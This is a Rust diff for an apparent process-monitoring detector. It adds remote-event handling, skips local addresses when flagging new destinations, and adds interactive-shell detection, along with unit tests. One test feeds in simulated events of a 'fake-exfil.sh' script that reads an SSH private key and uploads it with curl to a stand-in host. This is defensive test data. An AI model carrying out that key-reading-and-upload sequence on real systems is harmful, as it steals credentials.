@@ -179,6 +179,9 @@ pub struct Tracker {
     pub baseline: Baseline,
     /// Until this time (Unix ms) the baseline only learns and raises no `new_*` flags.
     pub learn_until_ms: u64,
+    /// Look up processes we haven't seen fork in this machine's /proc. Off when the events
+    /// come from another machine (a VM), where these pids mean something else.
+    local_proc: bool,
 }
 
 impl Tracker {
@@ -191,7 +194,16 @@ impl Tracker {
             episodes: HashMap::new(),
             baseline,
             learn_until_ms,
+            local_proc: true,
         }
+    }
+
+    /// Events come from another machine: never read the local /proc, and don't drop events
+    /// whose pid happens to equal this process's.
+    pub fn remote(mut self) -> Self {
+        self.local_proc = false;
+        self.own_pid = 0;
+        self
     }
 
     pub fn ingest(&mut self, ev: Event) {
@@ -330,8 +342,11 @@ impl Tracker {
         }
         let root = p.root;
         let by = basename(&p.exe).to_string();
-        let key = format!("{} {}", p.exe, dest);
-        let is_new = self.baseline.destinations.insert(key) && !learning;
+        // This machine's own unspecified and loopback addresses are not destinations
+        // (sshd connects to 0.0.0.0:22 and [::]:22 during every login).
+        let is_new = !is_local_dest(&dest)
+            && self.baseline.destinations.insert(format!("{} {}", p.exe, dest))
+            && !learning;
         self.ensure_episode(root, ts);
         let ep = self.episodes.get_mut(&root).expect("episode just ensured");
         ep.last_ms = ep.last_ms.max(ts);
@@ -355,7 +370,7 @@ impl Tracker {
         }
         // Forked since dnom started: we know the parent from the fork event. Otherwise /proc.
         let forked_from = self.parent_of.get(&pid).copied();
-        let proc_info = if forked_from.is_some() { None } else { read_proc(pid) };
+        let proc_info = if forked_from.is_some() || !self.local_proc { None } else { read_proc(pid) };
         let ppid = forked_from
             .or(proc_info.as_ref().and_then(|i| i.ppid))
             .filter(|&pp| pp > 1 && pp != pid);
@@ -419,7 +434,11 @@ impl Tracker {
             return true;
         }
         // An interactive shell: a shell started directly by a terminal, sshd, tmux, ...
+        // Each command typed in it is its own episode. A shell running a script or `-c`
+        // (e.g. `ssh host 'cd x && ./script.sh'`, which bash may exec into the script under
+        // the same pid) is not interactive: everything it starts belongs to one episode.
         SHELLS.contains(&parent.comm.as_str())
+            && is_interactive_shell_argv(&parent.argv)
             && parent
                 .ppid
                 .and_then(|g| self.procs.get(&g))
@@ -562,6 +581,28 @@ fn read_proc(pid: u32) -> Option<ProcInfo> {
     Some(ProcInfo { ppid, comm, uid, exe, argv })
 }
 
+/// True for `ip:port` / `[ip]:port` destinations on this machine itself: unspecified
+/// (0.0.0.0, ::) or loopback (127.0.0.0/8, ::1).
+fn is_local_dest(dest: &str) -> bool {
+    dest.parse::<std::net::SocketAddr>()
+        .is_ok_and(|a| a.ip().is_unspecified() || a.ip().is_loopback())
+}
+
+/// True if a shell's arguments look like an interactive session: only options, and no
+/// `-c` (alone or in a cluster like `-lc`). A plain argument is a script to run.
+/// Unknown argv (process seen only through events) counts as interactive.
+fn is_interactive_shell_argv(argv: &[String]) -> bool {
+    argv.iter().skip(1).all(|a| {
+        if let Some(long) = a.strip_prefix("--") {
+            long != "command"
+        } else if let Some(short) = a.strip_prefix('-') {
+            !short.is_empty() && !short.contains('c')
+        } else {
+            false
+        }
+    })
+}
+
 pub fn basename(path: &str) -> &str {
     path.rsplit('/').next().unwrap_or(path)
 }
@@ -621,6 +662,66 @@ redact:
         assert_eq!(json["files"]["credentials"][0], "/opt/app/session");
         assert_eq!(json["root"]["argv"], "app APP_SESSION=[redacted]");
         assert!(!json.to_string().contains("example-secret"));
+    }
+
+    #[test]
+    fn local_destinations_are_never_new() {
+        for local in ["0.0.0.0:22", "[::]:22", "127.0.0.53:53", "[::1]:8009"] {
+            assert!(is_local_dest(local), "{local}");
+        }
+        for remote in ["203.0.113.7:443", "[2001:db8::1]:443", "10.0.0.12:22"] {
+            assert!(!is_local_dest(remote), "{remote}");
+        }
+        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
+        let sshd = 4_190_201;
+        t.ingest(ev(0, sshd, 0, "sshd-session", exec("/usr/lib/openssh/sshd-session", &["sshd-session"])));
+        t.ingest(ev(1, sshd, 0, "sshd-session", Data::Net { op: "connect".into(), dest: "0.0.0.0:22".into() }));
+        t.ingest(ev(2, sshd, 0, "sshd-session", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));
+        let net = &t.episodes[&sshd].net;
+        assert_eq!(net.len(), 2, "local destinations are still recorded");
+        assert!(!net[0].new && net[1].new);
+    }
+
+    #[test]
+    fn interactive_shell_detection() {
+        let v = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
+        for interactive in [&["bash"][..], &["-bash"], &["/usr/bin/bash"], &["bash", "-l"], &["zsh", "-i", "--login"], &[]] {
+            assert!(is_interactive_shell_argv(&v(interactive)), "{interactive:?}");
+        }
+        for not in [&["bash", "-c", "ls"][..], &["bash", "-lc", "ls"], &["bash", "./script.sh"], &["sh", "x.sh", "-e"]] {
+            assert!(!is_interactive_shell_argv(&v(not)), "{not:?}");
+        }
+    }
+
+    /// `ssh vm 'cd ~/dnom && ./scripts/fake-exfil.sh'`: sshd-session starts `bash -c`, which
+    /// execs into the script under the same pid. Its children (cat, curl) must stay in the
+    /// script's episode, not become separate "typed commands".
+    #[test]
+    fn script_under_sshd_is_one_episode() {
+        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
+        let (sshd, script, cat, curl) = (4_190_101, 4_190_102, 4_190_103, 4_190_104);
+        t.ingest(ev(0, sshd, 0, "sshd-session", exec("/usr/lib/openssh/sshd-session", &["sshd-session: lab@notty"])));
+        t.ingest(ev(1, sshd, 0, "sshd-session", Data::Fork { child: script }));
+        t.ingest(ev(2, script, 1000, "bash", exec("/usr/bin/bash", &["bash", "-c", "cd ~/dnom && ./scripts/fake-exfil.sh"])));
+        t.ingest(ev(3, script, 1000, "bash", exec("/usr/bin/bash", &["bash", "./scripts/fake-exfil.sh"])));
+        t.ingest(ev(4, script, 1000, "bash", Data::Fork { child: cat }));
+        t.ingest(ev(5, cat, 1000, "cat", exec("/usr/bin/cat", &["cat", "/tmp/x/.ssh/id_ed25519"])));
+        t.ingest(ev(6, cat, 1000, "cat", Data::Open { path: "/tmp/x/.ssh/id_ed25519".into(), flags: 0, write: false }));
+        t.ingest(ev(7, script, 1000, "bash", Data::Fork { child: curl }));
+        t.ingest(ev(8, curl, 1000, "curl", exec("/usr/bin/curl", &["curl", "https://203.0.113.7/upload"])));
+        t.ingest(ev(9, curl, 1000, "curl", Data::Net { op: "connect".into(), dest: "203.0.113.7:443".into() }));
+        let ep = &t.episodes[&script];
+        assert_eq!(ep.files["credentials"].len(), 1);
+        assert_eq!(ep.net.len(), 1, "curl's connection belongs to the script's episode");
+        assert!(!t.episodes.contains_key(&curl) && !t.episodes.contains_key(&cat));
+
+        // An interactive login shell under sshd still splits typed commands.
+        let (shell, ls) = (4_190_111, 4_190_112);
+        t.ingest(ev(10, sshd, 0, "sshd-session", Data::Fork { child: shell }));
+        t.ingest(ev(11, shell, 1000, "bash", exec("/usr/bin/bash", &["-bash"])));
+        t.ingest(ev(12, shell, 1000, "bash", Data::Fork { child: ls }));
+        t.ingest(ev(13, ls, 1000, "ls", exec("/usr/bin/ls", &["ls"])));
+        assert!(t.episodes.contains_key(&ls), "a typed command is its own episode");
     }
 
     /// A shell known only from its parent's fork must not show up as root (uid 0).
